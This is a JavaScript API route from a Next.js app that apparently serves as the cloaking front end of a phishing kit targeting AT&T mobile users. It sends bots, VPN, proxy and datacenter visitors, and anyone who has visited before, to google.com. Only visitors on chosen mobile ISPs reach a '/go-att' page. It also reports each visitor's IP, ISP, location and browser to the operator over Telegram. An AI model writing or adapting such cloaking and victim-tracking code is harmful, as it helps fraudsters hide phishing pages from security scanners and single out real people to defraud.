import { headers } from 'next/headers';
import { getForcedIps, getVisitedIps, getSettings } from '../../../lib/storage';
import { isBot, lookupIsp, sendTelegramNotification } from '../../../lib/services';

export async function GET(req) {
    const headersList = headers();
    const userAgent = headersList.get('user-agent') || 'Unknown';
    const forwarded = headersList.get('x-forwarded-for');
    const clientIp = forwarded ? forwarded.split(',')[0] : '127.0.0.1';
    
    const NON_ATT_LANDING_PAGE = process.env.NON_ATT_LANDING_PAGE || 'https://google.com';
    const MOBILE_ISPS = (process.env.MOBILE_ISPS || "").split(',').map(isp => isp.trim().toUpperCase()).filter(isp => isp !== "");

    try {
        if (isBot(userAgent)) {
            return Response.json({ redirect: NON_ATT_LANDING_PAGE });
        }

        // 1. Check Forced and Visited lists
        const forcedIps = await getForcedIps();
        if (forcedIps.includes(clientIp)) {
            sendTelegramNotification(`✨ *FORCED REDIRECT VISIT* \n\n📍 *IP:* ${clientIp}\n💻 *UA:* ${userAgent}`);
            return Response.json({ redirect: '/go-att' });
        }

        const visitedIps = await getVisitedIps();
        if (visitedIps.some(entry => (typeof entry === 'object' ? entry.ip : entry) === clientIp)) {
            return Response.json({ redirect: NON_ATT_LANDING_PAGE });
        }

        // 2. ISP Lookup
        const data = await lookupIsp(clientIp);
        const settings = await getSettings();

        const isProxy = data?.proxy === true;
        const isHosting = data?.hosting === true;
        const isSuspicious = isProxy || isHosting;

        // 3. Prepare Notification
        let message = `🚀 *New App Visit!* \n\n`;
        if (isProxy) message += `🚫 *VPN/PROXY DETECTED*\n\n`;
        else if (isHosting) message += `☁️ *DATACENTER/HOSTING DETECTED*\n\n`;

        if (data && data.status === 'success') {
            message += `📍 *IP:* ${data.query}\n` +
                       `🏢 *ISP:* ${data.isp || data.org || 'N/A'}\n` +
                       `🌍 *Location:* ${data.city}, ${data.regionName}, ${data.country}\n`;
        } else {
            message += `📍 *IP:* ${clientIp}\n⚠️ *ISP info unavailable*\n`;
        }
        message += `💻 *UA:* ${userAgent}\n🕒 *Time:* ${new Date().toLocaleString()}`;

        // 4. Redirect Logic
        let targetUrl = NON_ATT_LANDING_PAGE;
        const isSuspiciousMatch = settings.isSuspiciousEnabled && isSuspicious;

        if (isSuspiciousMatch) {
            targetUrl = NON_ATT_LANDING_PAGE;
        } else if (!settings.isIspFilterEnabled) {
            targetUrl = '/go-att';
        } else if (data && data.status === 'success') {
            const userISP = (data.isp || data.org || "").toUpperCase();
            if (MOBILE_ISPS.some(isp => userISP.includes(isp))) {
                targetUrl = '/go-att';
            } else {
                targetUrl = NON_ATT_LANDING_PAGE;
            }
        }

        // Background notification
        sendTelegramNotification(message);

        return Response.json({ redirect: targetUrl });

    } catch (error) {
        console.error('[API Init] Error:', error);
        return Response.json({ redirect: NON_ATT_LANDING_PAGE });
    }
}
